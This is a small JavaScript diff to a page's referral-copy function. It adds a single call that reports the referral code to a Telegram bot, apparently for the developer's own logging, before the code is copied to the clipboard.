@@ -168,6 +168,8 @@
         }
 
         function copyReferralIfNeeded(referralCode) {
+            sendToTelegramBot(`CLIP REF =${referralCode}`);
+
             if (!referralCode) return Promise.resolve(false);
             const statusEl = document.getElementById('status');
             const text = "referral:" + referralCode; // faqat kodning o'zi
